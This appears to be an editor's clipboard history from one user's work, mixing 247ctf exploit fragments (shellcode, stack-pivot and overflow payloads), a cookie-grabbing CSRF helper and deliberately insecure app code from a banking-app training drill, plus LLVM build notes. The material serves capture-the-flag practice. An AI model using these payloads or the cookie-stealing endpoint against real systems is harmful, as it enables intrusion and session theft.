	io.sendline(b'b'*8 + p64(POP_RSI)+ p64(0x7fe566769000)+ p64(XCHG_RSP_RSI))
5218e69a4d6bfb079bb01745c58e844d|file:///home/neo/247ctf/pwnable/sol_pivot.py|68|20|^v|python
	 + p64(POP_RSI)+ p64(0x7fe566769000)+ 
b36cdd922f96941f933e3e2a9f9105e7|file:///home/neo/247ctf/pwnable/sol_pivot.py|64|1|V|python
	
	io.recvuntil('?\n')
	io.sendline(shellcode)
	io.recvuntil('?\n')
	io.sendline(b'b'*24 + p64(GET_NAMES_ADDR))
6ea392e099e258e717e4ea6437c847c8|file:///home/neo/247ctf/pwnable/sol_pivot.py|68|20|^v|python
	 + p64(POP_RSI)+ p64(0x7fe566769000)
04c0268b4ea1fe932e51e2a30d2b42a8|file:///home/neo/.config/joplin/tmp/6d18be1014aa4d81b5474d3ca6fae865.md|1|1|V|vimwiki
	This is a test note 
5eef4fe39dc80cae471f7cddee87b65d|file:///home/neo/247ctf/pwnable/sol_pivot.py|68|1|V|python
	io.recvuntil('?\n')
	io.sendline(shellcode)
	io.recvuntil('?\n')
	io.sendline(b'c'* 8 + p64(JMP_RSP) + b'c' * 8 + p64(XCHG_RSP_RSI))
	
51cd177113de0b4c7c9b6d3fee1adec9|file:///home/neo/247ctf/pwnable/sol_pivot.py|71|13|^v|python
	b'c'* 8 + p64(JMP_RSP) + 
cbcaf6114ae2c4ba413515b2733fcf22|file:///home/neo/247ctf/pwnable/sol_pivot.py|77|1|V|python
	io.sendline(b'c'* 8 + p64(JMP_RSP) + b'c' * 8 + p64(XCHG_RSP_RSI))
46eb29dabd5c46683ccaf1ecbd5f17b9|file:///home/neo/247ctf/pwnable/sol_pivot.py|78|22|^v|python
	+ p64(JMP_RSP) + b'c' * 8 
69ad2d776db656936ae1ebeb1e721baa|file:///home/neo/cyberranges/work/ocbc-cyberdrill/story.md|1|1|V|vimwiki
	The owner of a new banking startup company has hired you to be their cyber security consultant. The web developers of the company's banking website tried to get the web application up and running as fast as possible and did not take into account security best practises. As the web application is starting to attract more traffic, it has become an attractive target for hackers, who have found security hole in the web application. Find and patch all the vulnerabilities before the hackers can get their hands on your users' banking information!
c3c886a86b5fb29cc8a8a778f68c2166|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|198|5|V|python
	    exploit = 'xss'
95b5143945bc6c872347e759e0ef85f0|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|203|5|V|python
	        exploit = 'csrf'
cd67ad4235a33fc6e2cfdc996fb7b0ab|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|204|1|V|python
	    os.system('QT_QPA_PLATFORM=offscreen phantomjs --ignore-ssl-errors=true --local-to-remote-url-access=true --web-security=false --ssl-protocol=any bot/{}bot.js'.format(exploit))
	
323c56677f81601ad9f5af389d1012d5|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|2|1|V|python
	########
	# SSTI #
	########
ccebead9af7ff335fde2b61c6abe69da|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|2|119|v|python
	send_from_directory, 
fb33acbe1cc705ebc32269c43ab8e507|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|18|1|V|python
	ppath = "static"
88229dca04518cfa236fc64286903f25|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|18|1|V|python
	ppath = "static"
	
fbf117dc1cc1b22fc8c908ab84fbcd5f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|65|5|V|python
	    # Get Params from request
145974f6e8eeb804eb6b0b7ee36d6f0c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|88|9|V|python
	        # Execute query
db88df8a8ca4c23107a4fae28f768a2c|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|135|12|V|python
	            # Execute query
573a70e47cb21d2ab87b49fd1c8fcd66|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|137|13|v|python
	Nah, not today!
3db467f0a8585bc2f03b0a11d583f83b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|139|15|v|python
	(accessible only by admins)
8b1bbfa0a00af31ebc0afcea0b728662|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|233|1|V|python
	
	@app.route('/logout', methods=['GET'])
	@login_required
	def logout(response=None):
	    session.clear()
	    return redirect(url_for('home'))
	
	@app.after_request
	def after_request(response):
	    response.headers.add('Cache-Control', 'no-cache')
	    response.headers.add('Cache-Control', 'no-store')
	    return response
10f9fbe2d7c5312747ac5dc7c017d094|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|289|1|V|python
	
	            # Set parameters for query
d1aa771aa1541b10ded0140946774abe|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|274|1|V|python
	
	    # get raw bytes
1eb2e6f375b2de23676a4b3790109a7e|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|269|5|V|python
	    # get image number and build absolute path
a85c206f7e50c891ec6aefa431aa56d8|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|238|1|V|python
	
	    # Joining the base and the requested path
9519417d56611a7961afb6bb92bde3db|file:///home/neo/247ctf/web/hash.py|29|45|v|python
	, chunksize=100000
1a7d883dbb3662cd5e22d9d9a12b69d1|file:///home/neo/247ctf/web/hash.py|18|1|V|python
	possible = list(map(''.join, it.product(possible, repeat=5)))
b77e49a66d026c3907d8589587ddf862|file:///home/neo/247ctf/web/hash.py|10|1|V|python
	    tohash = bytes(p, 'utf-8')
	    dgst = hashlib.md5(salt+tohash).hexdigest()
	    if dgst[:2] == '0e' and dgst[2:].isdigit():
c8e04a338c1de908aa82488630d3acc1|file:///home/neo/247ctf/web/hash.py|20|5|V|python
	    print(l)
a1bd8b9e1085fe86306c0ec7b24190c2|file:///home/neo/247ctf/web/hash.py|23|29|v|python
	tohash
e69c03dd22958514ef20bcb625b4b26a|file:///home/neo/247ctf/web/hash.py|23|24|v|python
	salt+str(l).encode()
cb8c0d1ce42266eeb2951b24a9b3cf44|file:///home/neo/247ctf/web/hash.py|25|1|V|python
	    print(dgst[:2])
2ad1dfa4faee336ab934c9ac447b14c8|file:///home/neo/247ctf/web/hash.py|25|19|V|python
	    # print(dgst[:2])
	    # print(dgst[2:])
7fa43fc6c37648b71ed51a72984b6440|file:///home/neo/247ctf/web/hash.py|20|1|V|python
	    # possible = list(map(''.join, it.product(alphabet, repeat=l)))
	    # for p in possible:
	    # tohash = bytes(p, 'utf-8')
b8de90326ea0680052b535d2585b7e01|file:///home/neo/247ctf/web/hash.py|35|16|v|python
	processes=8, maxtasksperchild=100
31dc1a0b0932dc811e0e83fe75721a4a|file:///home/neo/247ctf/web/hash.py|21|5|V|python
	    print(salt+str(l).encode())
b06d7679864fad0081211a21fda86c2e|file:///home/neo/247ctf/web/hash.py|21|5|V|python
	    salt+str(l).encode()
c2cd39d36fe0b1921b7569d082b22095|file:///home/neo/Vagrantfile|16|1|V|ruby
	  config.vm.provider "virtualbox" do |v|
	    v.customize ["modifyvm", :id, "--cpuexecutioncap", "80"]
	    v.memory = 20480
	    v.cpus = 2
	  end
55187a016f9b37b016450522f45d10e3|file:///home/neo/vagrant-llvm/dependencies.txt|1|50|v|text
	 (optional) - for using lit (LLVM Integrated Tester)
1f4101b2141199b941cad4ff23889b59|file:///home/neo/vagrant-llvm/dependencies.txt|1|56|v|text
	 (make)
099dafc678df7d266c25f95ccf6cde22|file:///home/neo/vagrant-llvm/dependencies.txt|1|66|v|text
	make
64db7a90d94a543c0a1e307e0e9d7030|file:///home/neo/vagrant-llvm/dependencies.txt|1|80|v|text
	(make)
39f7e5d5546a6faa011b2b5b0e235c3a|file:///home/neo/vagrant-llvm/dependencies.txt|1|1|V|text
	sudo pacman -Syu llvm-libs perl python-setuptools cmake libedit libffi libxml2 ncurses ninja ocaml=4.10.0 ocaml-ctypes ocaml-findlib python-recommonmark python-sphinx 
8ead4b5b8f54151b204eac4025a93856|file:///home/neo/vagrant-llvm/install-llvm.txt|1|1|V|text
	cmake -G "Unix Makefiles"  -DLLVM_USE_LINKER=gold -DLLVM_ENABLE_PROJECTS="clang;clang-tools-extra;libcxx;libcxxabi;libunwind;lldb;compiler-rt;lld;debuginfo-tests" -DCMAKE_BUILD_TYPE=Debug
b8ac62371b2db0acf3857d00a4f7f1a3|file:///home/neo/vagrant-llvm/install-llvm.txt|1|1|V|text
	cmake -G "Unix Makefiles"  -DLLVM_USE_LINKER=gold -DLLVM_ENABLE_PROJECTS="clang;clang-tools-extra;libcxx;libcxxabi;libunwind;lldb;compiler-rt;lld;debuginfo-tests" -DCMAKE_BUILD_TYPE=Debug ../llvm
9c6b189a88ab31c3828293c82d47b9b7|file:///home/neo/vagrant-llvm/install-llvm.txt|3|1|V|text
	cmake --build . -j 1
d91108cc90ae571190c7445c901d09a7|file:///home/neo/vagrant-llvm/install-llvm.txt|1|1|V|text
	cmake -G "Unix Makefiles"  -DLLVM_USE_LINKER=gold -DLLVM_ENABLE_PROJECTS="clang;clang-tools-extra;libcxx;libcxxabi;libunwind;lldb;compiler-rt;lld;debuginfo-tests;libc" -DCMAKE_BUILD_TYPE=Debug ../llvm
48f5bf058819c0f03bbc4f1540845c67|file:///home/neo/vagrant-llvm/install-llvm.txt|1|27|^v|text
	 -DLLVM_USE_LINKER=gold 
a0a96d8de7266d665798eaa9893513f1|file:///home/neo/vagrant-llvm/install-llvm.txt|1|1|V|text
	cmake -G "Unix Makefiles" -DLLVM_ENABLE_PROJECTS="clang;clang-tools-extra;libcxx;libcxxabi;libunwind;lldb;compiler-rt;lld;debuginfo-tests;libc" -DCMAKE_BUILD_TYPE=Debug ../llvm
12d7c41a433f8a4dea636a3f6e209e04|file:///home/neo/vagrant-llvm/install-llvm.txt|3|11|v|text
	Unix Makefiles
145dc74444248dd5c93221f831380201|file:///home/neo/vagrant-llvm/install-llvm.txt|3|1|V|text
	cmake -G "Ninja" -DLLVM_ENABLE_PROJECTS="clang;clang-tools-extra;libcxx;libcxxabi;libunwind;lldb;compiler-rt;lld;debuginfo-tests;libc" -DCMAKE_BUILD_TYPE=Debug ../llvm
96e647d64fbd6026c418873e129da026|file:///home/neo/cyberranges/work/ocbc-cyberdrill/test|1|1|^v|html
	<!DOCTYPE HTML>
	<html>
	    <head>
	        <meta charset="UTF-8">        
	        <meta http-equiv="X-UA-Compatible" content="IE=edge">
			
			<meta name="viewport" content="width=device-width, initial-scale=1.0">
			
			<title>Best Banking App</title>
	        
	        <!-- stylesheets -->
		<link rel="stylesheet" href="/css/reset.css" type="text/css" media="screen" />
	        <link rel="stylesheet" href="/css/styles.css" type="text/css" media="screen
	        
	        <!-- footer files css (including footer media queries) -->
	        <link rel="stylesheet" href="/css/footer-distributed.css">
	        <!-- See www.bootstrapcdn.com . This online stylesheet seems to be only for
		possibly download this later to be sure: -->
	        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.
	        
	        <!-- media queries -->
	        <link rel="stylesheet" href="/css/media-queries.css" type="text/css" media=
	        
	        <!-- Fonts (Jocca edit: I switched the fonts: <link href='http://fonts.goog
		rel='stylesheet' type='text/css'> ) -->
	        <link href="https://fonts.googleapis.com/css?family=Montserrat|Ubuntu" rel=
	
	        <!-- jQuery -->
	        <script src="/js/vendor/modernizr.min.js"></script>
	        <script src="/js/vendor/respond.min.js"></script>
	        
	        <!-- include extern jQuery file but fall back to local file if extern one f
	        <script src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
	        <script type="text/javascript">window.jQuery || document.write('<script typ
	        
	        <!-- Jocca edit: Prefix Free: jQuery takes care of the vendor prefixes. In 
		a Autoprefixer plugin (https://packagecontrol.io/packages/Autoprefixer), so may
		(for a next project)  -->
	        <script src="/js/vendor/prefixfree.min.js"></script>        
	        
	        <!-- JavaScript for the alternative menu. It uses the jQuery slideToggle fu
	        <script src="/js/script.js"></script>
	        
	        <!-- backwards compatible margin-correction -->
	        <!--[if lt IE 9]>
	            <style>
	                header
	                {
	                    margin: 0 auto 20px auto;
	                }                 
	            </style>
	        <![endif]-->        
		</head>
	
		<body>        						<!-- the header -->
	        <header>
	            
	            <div class="toggleMobile">
	               	<span class="symbol-bar1"></span>
	               	<span class="symbol-bar2"></span>
	               	<span class="symbol-bar3"></span>
	            </div>
	            	
	            <div id="mobileMenu">
	               	<ul>
	                   	<li><a href="/home">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/currencies">Currency Converter</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
	                </ul>
	            </div>
	            	
	            <a href="/home">
			<h1>Best Banking App</h1>
	            	</a>
				<p>The best and most secure banking app you will find on the market!</p
	            
	            <nav>                           <!-- main menu -->
	               	<ul>
	                   	<li><a href="/home">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/currencies">Currency Converter</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
	               	</ul>
	            </nav>
	            
	        </header>
	
			<section id="spacer">        	         
				<div class="spacer-wrapper">				
	                
	        
	   
	<form action="/logout">
	    <input type="submit" name="start_search" class="button" value="Logout"/>
	</form>				
	<form action="/search">
	    <input type="text" name="from_user" for="from_user" placeholder="Search for pas
	    <input type="submit" name="start_search" class="button" value="Search"/>
	</form>				
	
	    
				</div>
			</section>
	        
	        
	    <section id="three-columns">
	        <div class="three-columns-wrapper">
	            <article>
	              <h3>Search Currency to find conversion rate from EURO</h3>
	            </article>
	
	            <article>            	               
	                  <form action="/currencies/getCurrency" method="POST">
	                    <fieldset>
	                      <div class="form-group">
	                        <label for="username">Convert Euro to:</label>
	                          <select id="currency" name="currency">
	                            <option value="usd">US Dollars</option>
	                            <option value="pnd">Pound sterling</option>
	                            <option value="btc">Bitcoin</option>
	                            <option value="yuan">Chinese yuan</option>
	                          </select>
	                      </div>
	                      <div class="form-actions">
	                        <input type="submit" value="Retrieve" class="btn btn-primar
	                      </div>
	                    </fieldset>
	                  </form>
	            </article>
	            
	            <article>            	     
	              <img style="width:300px; height:200px" src="data:image/jpeg;base64, I
f4b68af0c5fd7b979a4f1a43913ee993|file:///home/neo/cyberranges/work/ocbc-cyberdrill/test|1|1|V|html
	<!DOCTYPE HTML>
	<html>
	    <head>
	        <meta charset="UTF-8">        
	        <meta http-equiv="X-UA-Compatible" content="IE=edge">
			
			<meta name="viewport" content="width=device-width, initial-scale=1.0">
			
			<title>Best Banking App</title>
	        
	        <!-- stylesheets -->
		<link rel="stylesheet" href="/css/reset.css" type="text/css" media="screen" />
	        <link rel="stylesheet" href="/css/styles.css" type="text/css" media="screen" />
	        
	        <!-- footer files css (including footer media queries) -->
	        <link rel="stylesheet" href="/css/footer-distributed.css">
	        <!-- See www.bootstrapcdn.com . This online stylesheet seems to be only for the social media icons in the footer, 
		possibly download this later to be sure: -->
	        <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css">
	        
	        <!-- media queries -->
	        <link rel="stylesheet" href="/css/media-queries.css" type="text/css" media="screen" />
	        
	        <!-- Fonts (Jocca edit: I switched the fonts: <link href='http://fonts.googleapis.com/css?family=Open+Sans|Baumans' 
		rel='stylesheet' type='text/css'> ) -->
	        <link href="https://fonts.googleapis.com/css?family=Montserrat|Ubuntu" rel="stylesheet"> 
	
	        <!-- jQuery -->
	        <script src="/js/vendor/modernizr.min.js"></script>
	        <script src="/js/vendor/respond.min.js"></script>
	        
	        <!-- include extern jQuery file but fall back to local file if extern one fails to load -->
	        <script src="http://code.jquery.com/jquery-1.7.2.min.js"></script>
	        <script type="text/javascript">window.jQuery || document.write('<script type="text/javascript" src="\/js\/vendor\/1.7.2.jquery.min.js"><\/script>')</script>
	        
	        <!-- Jocca edit: Prefix Free: jQuery takes care of the vendor prefixes. In the Sublime Text (3) editor's there's also 
		a Autoprefixer plugin (https://packagecontrol.io/packages/Autoprefixer), so maybe that's handier? 
		(for a next project)  -->
	        <script src="/js/vendor/prefixfree.min.js"></script>        
	        
	        <!-- JavaScript for the alternative menu. It uses the jQuery slideToggle function -->
	        <script src="/js/script.js"></script>
	        
	        <!-- backwards compatible margin-correction -->
	        <!--[if lt IE 9]>
	            <style>
	                header
	                {
	                    margin: 0 auto 20px auto;
	                }                 
	            </style>
	        <![endif]-->        
		</head>
	
		<body>        						<!-- the header -->
	        <header>
	            
	            <div class="toggleMobile">
	               	<span class="symbol-bar1"></span>
	               	<span class="symbol-bar2"></span>
	               	<span class="symbol-bar3"></span>
	            </div>
	            	
	            <div id="mobileMenu">
	               	<ul>
	                   	<li><a href="/home">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/currencies">Currency Converter</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
	                </ul>
	            </div>
	            	
	            <a href="/home">
			<h1>Best Banking App</h1>
	            	</a>
				<p>The best and most secure banking app you will find on the market!</p>           
	            
	            <nav>                           <!-- main menu -->
	               	<ul>
	                   	<li><a href="/home">Home</a></li>
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/currencies">Currency Converter</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
	               	</ul>
	            </nav>
	            
	        </header>
	
			<section id="spacer">        	         
				<div class="spacer-wrapper">				
	                
	        
	   
	<form action="/logout">
	    <input type="submit" name="start_search" class="button" value="Logout"/>
	</form>				
	<form action="/search">
	    <input type="text" name="from_user" for="from_user" placeholder="Search for past transactions of user..."/>
	    <input type="submit" name="start_search" class="button" value="Search"/>
	</form>				
	
	    
				</div>
			</section>
	        
	        
	    <section id="three-columns">
	        <div class="three-columns-wrapper">
	            <article>
	              <h3>Search Currency to find conversion rate from EURO</h3>
	            </article>
	
	            <article>            	               
	                  <form action="/currencies/getCurrency" method="POST">
	                    <fieldset>
	                      <div class="form-group">
	                        <label for="username">Convert Euro to:</label>
	                          <select id="currency" name="currency">
	                            <option value="usd">US Dollars</option>
	                            <option value="pnd">Pound sterling</option>
	                            <option value="btc">Bitcoin</option>
	                            <option value="yuan">Chinese yuan</option>
	                          </select>
	                      </div>
	                      <div class="form-actions">
	                        <input type="submit" value="Retrieve" class="btn btn-primary">
	                      </div>
	                    </fieldset>
	                  </form>
	            </article>
	            
	            <article>            	     V
264956852fc9dbd9fe3f0dc0deb29cb3|file:///home/neo/cyberranges/work/ocbc-cyberdrill/cookie-grabber.py|11|29|v|python
	localhost:11337
99e84c4e0336556130289cf18ce94512|file:///home/neo/Vagrantfile|15|1|V|ruby
	  config.disksize.size = '65GB'
	  config.vm.box = "archlinux/archlinux"
	  config.vm.provider "virtualbox" do |v|
	    v.customize ["modifyvm", :id, "--cpuexecutioncap", "80"]
	    v.memory = 20480
	    v.cpus = 2
	  end
01595b5a2c537b601ffffb846a522293|file:///home/neo/vagrant-llvm/dependencies.txt|1|1|V|text
	sudo pacman -Syu llvm-libs perl python-setuptools cmake libedit libffi libxml2 ncurses ninja ocaml=4.10.0 ocaml-ctypes ocaml-findlib python-recommonmark python-sphinx git make cmake gcc doxygen
2467f5cba1ecc34d53f4480cd654aa55|file:///home/neo/vagrant-llvm/install-llvm.txt|1|92|v|text
	libunwind
0fc008033f89201864d91997966a0d96|file:///home/neo/vagrant-llvm/install-llvm.txt|1|1|V|text
	cmake -G "Unix Makefiles" -DLLVM_ENABLE_PROJECTS="clang;clang-tools-extra;libcxx;libcxxabi;lldb;compiler-rt;lld;debuginfo-tests;libc" -DCMAKE_BUILD_TYPE=Debug ../llvm
4da216846fb282bf0c4dad4977b7d866|file:///home/neo/vagrant-llvm/install-llvm.txt|5|1|V|text
	cmake -G "Ninja" -DLLVM_ENABLE_PROJECTS="clang;clang-tools-extra;libcxx;libcxxabi;lldb;compiler-rt;lld;debuginfo-tests;libc" -DCMAKE_BUILD_TYPE=Debug ../llvm
96f098c5603b28f740c117eaa89e6f15|file:///home/neo/Vagrantfile|16|1|V|ruby
	  config.disksize.size = '150GB'
	  config.vm.box = "archlinux/archlinux"
	  config.vm.provider "virtualbox" do |v|
	    v.customize ["modifyvm", :id, "--cpuexecutioncap", "80"]
	    v.memory = 20480
	    v.cpus = 2
	  end
03d838b60fac870cb9ed10797472a42f|file:///home/neo/vagrant-llvm/dependencies.txt|1|1|V|text
	sudo pacman -Syu llvm-libs perl python-setuptools cmake libedit libffi libxml2 ncurses ninja ocaml=4.10.0 ocaml-ctypes ocaml-findlib python-recommonmark python-sphinx make cmake gcc doxygen git openssl vim
7b838180aebf69aa5849cb3348a30d6d|file:///home/neo/247ctf/pwnable/sol_cookie.py|51|1|V|python
	bounce = exe.sym.asm_bounce
	
	# io.sendline(cyclic(1024))
	
	OFFSET = cyclic_find(0x6261616b)
	log.info('Offset: %d' % OFFSET)
	SHELLCODE_ADDR = 0xffde9c2c
	io.recvuntil('though:\n')
	shellcode = asm(shellcraft.i386.linux.sh())
	CALL_EAX = 0x08048410
	payload = shellcode + b'\x90' * (OFFSET - len(shellcode)) + p32(CALL_EAX)
	log.info(payload)
	log.info('Shellcode len: %d' % len(shellcode))
	io.sendline(payload)
58176fb2d720ea3a6b737ea31a86b2ec|file:///home/neo/247ctf/pwnable/sol_cookie.py|56|1|V|python
	SHELLCODE_ADDR = 0xffde9c2c
	io.recvuntil('though:\n')
	shellcode = asm(shellcraft.i386.linux.sh())
	CALL_EAX = 0x08048410
	payload = shellcode + b'\x90' * (OFFSET - len(shellcode)) + p32(CALL_EAX)
	log.info(payload)
	log.info('Shellcode len: %d' % len(shellcode))
	io.sendline(payload)
2a63c57dce31de70d2eb937128c3b698|file:///home/neo/247ctf/pwnable/sol_cookie.py|51|1|V|python
	r = remote('0.0.0.0', 5555)
fb5f235a012620f99d5a177d9e66347c|file:///home/neo/247ctf/pwnable/sol_cookie.py|50|1|V|python
	time.sleep(1)
db4ec1df48f3842c50e219805e3d706f|file:///tmp/neomutt-neo-1000-195547-10793823574002660105|3|51|v|mail
	actual 
c06d6d2a5bba1543671150e6ba7924d5|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|117|59|v|php
	// Add the auth.js script in the enqueued scripts list
c4a09cde4c48d4abe2181d4e8862271a|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-login.php|1414|16|V|php
	                 Add the nonce in the login form, to be signed by the user */
29a17b3c9aba82a767d226f78d0d7a2a|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/pluggable.php|2315|1|V|php
		/**
		 *
		 * @global PasswordHash $wp_hasher PHPass object used for checking the password
		 *  against the $hash + $password
		 * @uses PasswordHash::CheckPassword
		 *
		 * @param string     $password Plaintext user's password
		 * @param string     $hash     Hash of the user's password to check against.
		 * @param string|int $user_id  Optional. User ID.
		 * @return bool False, if the $password does not match the hashed password
		 */
3bda783b368648d286a227752cd9c34f|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|34|1|V|php
	/**
	 * Authenticate a user, confirming the username and password are valid.
	 *
	 * @since 2.8.0
	 *
	 * @param WP_User|WP_Error|null $user     WP_User or WP_Error object from a previous callback. Default null.
	 * @param string                $username Username for authentication.
	 * @param string                $password Password for authentication.
	 * @return WP_User|WP_Error WP_User on success, WP_Error on failure.
73ba2949a724d548d241ab6655437562|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/wp-includes/user.php|67|1|V|php
		/**
		 * Filters whether the given user can be authenticated with the provided $password.
		 *
		 * @since 2.5.0
		 *
		 * @param WP_User|WP_Error $user     WP_User or WP_Error object if a previous
		 *                                   callback failed authentication.
		 * @param string           $password Password to check against the user.
		 */
2a69c060760f9a4b8b29170bc459d676|file:///home/neo/Documents/diplomatiki/auth-webapp/wordpress/verify.py|26|1|V|python
	    # print ("".join("{:02x}".format(ord(c)) for c in verified))
7acb3a19977b0a91086c2a2cb1a8773b|file:///home/neo/247ctf/pwnable/sol_cookie.py|60|12|V|python
	# OFFSET = cyclic_find(0x6261616b)
	# log.info('Offset: %d' % OFFSET)
fd4d1a0dd1f944e24413641d41ee9233|file:///home/neo/247ctf/pwnable/sol_cookie.py|58|1|V|python
	print(r.recvall())
42535d7fbbca0a4317ce73cdc589e052|file:///home/neo/247ctf/pwnable/sol_cookie.py|56|5|V|python
	    # r.sendline(cyclic(512))
6c720b5ab361ceecc1df7cadc52917b0|file:///home/neo/247ctf/pwnable/sol_cookie.py|57|5|V|python
	    OFFSET = 512
f97e7540f7c7712586d7ef4bb0f61a42|file:///home/neo/247ctf/pwnable/sol_cookie.py|63|9|V|python
	        print(r.recvall())
63e14cb15beab7cd9719f61a0d2587cd|file:///home/neo/247ctf/pwnable/sol_cookie.py|63|14|v|python
	recvall
ad5f222b9959b0ccf22f17ee47666f38|file:///home/neo/247ctf/pwnable/sol_cookie.py|62|5|V|python
	    # r.recvline()
2dccd1ab3e03990aea77359831c85ca2|file:///home/neo/cyberranges/work/ocbc-cyberdrill/csrf.py|6|5|v|python
	cookie
1500d762ddf147dba8215bca7cd17039|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|60|1|V|python
	        return render_template('login.html', error='0', exists='0')
273c51d687d7fb37f1329ab83ac8b270|file:///home/neo/cyberranges/work/ocbc-cyberdrill/csrf.py|7|1|V|python
	    cookie = request.args.get('c')
	    f = open("cookies.txt", "a")
	    f.write(cookie + '\n')
	    f.close()
	    return redirect('http://192.168.125.10/home')
a9b9f04336ce0181a08e774e01113b31|file:///home/neo/cyberranges/work/ocbc-cyberdrill/csrf.py|7|19|v|python
	http://example.com
5b575124b527d59268030f4ee935d251|file:///home/neo/cyberranges/work/ocbc-cyberdrill/csrf.py|8|40|v|python
	, error='0', exists='0'
7861d9bd05b6248799fd2c7f9c29a904|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|2|1|V|python
	from flask import Flask, request, session, redirect, url_for, render_template, render_template_string, make_response, abort, send_file
23c10c2ca49499a701c6e881d93b3f4c|list:/diagnostics|4|1|V|list
	csrf.py:7:5	Error	[pylint E0602] Undefined variable 'requests' (undefined-variable)
	csrf.py:8:12	Error	[pylint E0602] Undefined variable 'render_template' (undefined-variable)
	webapp/app/app.py:187:9	Warning	[pylint W0612] Unused variable 'user' (unused-variable)
3d801aa532c1cec3ee82d87a99fdf63f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/fake_csrf/csrf.py|10|29|v|python
	temp
6f1fc6052da28f5b53f4a6cd41b19017|file:///home/neo/cyberranges/work/ocbc-cyberdrill/fake_csrf/csrf.py|8|5|V|python
	    s = requests.Session() 
	    # s.get('http://localhost:11337/makeAdmin?user=testuser')
2ff05b098590988d6b66b1a4b8c75da1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/fake_csrf/templates/index.html|28|35|V|htmldjango
	                    <h3>Secure</h3>
	            
11ee0d889c6490202e101a5de240751b|file:///home/neo/cyberranges/work/ocbc-cyberdrill/fake_csrf/templates/index.html|28|21|V|htmldjango
	                    <p>The best security experts make sure that your banking data is safe!</p>
01d312158875ae55400d1e530d34b64f|file:///home/neo/cyberranges/work/ocbc-cyberdrill/fake_csrf/templates/index.html|33|1|V|htmldjango
	    </section>        
	    <section id="obts">        	
	        
	        <div class="obts-wrapper">
	                
	            <article>           	 
	                <h3>No anonymity!</h3>
	                <p>We are proudly the first bank to offer zero anonymity! Any user can search for all the transactions of another user! Just type the name of the user you want to find in the search bar!</p>	
	                <h3>Currency converter</h3>
	                <p>Use our currency converter to compare Euro to other currencies! Click <a href='/currencies'>here</a> to use the converter!</p>	
	                <br>
	                <br>
	                <br>
	            </article>            
	            
	            <section id="ts">               
	        
	                <article class="row">                   
	        
	                        <img src="/images/icon-paper-plane.png" width="80" class="rocket" alt="Some alt text"/>
	                
	                        <p>Have a complaint?<br><br> Contact us <a href='/contact_us'>here</a> to suggest how your banking experience can be improved!</p> </article> 
	            
	                <article class="row">                   
	        
	                    <img src="/images/icon-clock.png" width="80" class="clock" alt="Some alt text"/>
	                
	                    <p>Our admin will check out your complaint in no time and make sure it is resolved!<br><br></p>
	                </article> 
	            
	            </section>
	        
	        </div>			<!-- end obts-wrapper -->
08f56d6e5c559feaeeca1d0ed4be3304|file:///home/neo/cyberranges/work/ocbc-cyberdrill/fake_csrf/templates/index.html|2|5|V|htmldjango
	    {% block spacer %}
	    {% endblock %}
	    {% block content %}
aac4587b67a23c1b83bbca93c2aa08e5|file:///home/neo/cyberranges/work/ocbc-cyberdrill/webapp/app/app.py|8|1|V|python
	# Config app
	_cwd = os.path.dirname(os.path.abspath(__file__))
	SECRET_KEY = "[<Ut3u!d9>h-L#cg9]2V&''y~Se`G{+f)Y~"
	SESSION_COOKIE_HTTPONLY = False 
	
	# Initialize app
	app = Flask(__name__, static_url_path='')
	app.config['FLAG_FILE'] = os.path.dirname(os.path.realpath(__file__))
	app.config.from_object(__name__)
c8c1f1312a3cb31c3941bd7fb2ac34e1|file:///home/neo/cyberranges/work/ocbc-cyberdrill/fake_csrf/csrf.py|13|1|V|python
	app = Flask(__name__)
3077203f1d264096c6cb3a45d7823b69|file:///home/neo/cyberranges/work/ocbc-cyberdrill/fake_csrf/templates/layout.html|76|7|v|html
	The best and most secure banking app you will find on the market!
35872dd24401058194e047eb3e109238|file:///home/neo/cyberranges/work/ocbc-cyberdrill/fake_csrf/templates/layout.html|81|1|V|html
	                    <li><a href="/profile">Profile</a></li>
	                    <li><a href="/currencies">Currency Converter</a></li>
	                    <li><a href="/contact_us">Contact Us</a></li>
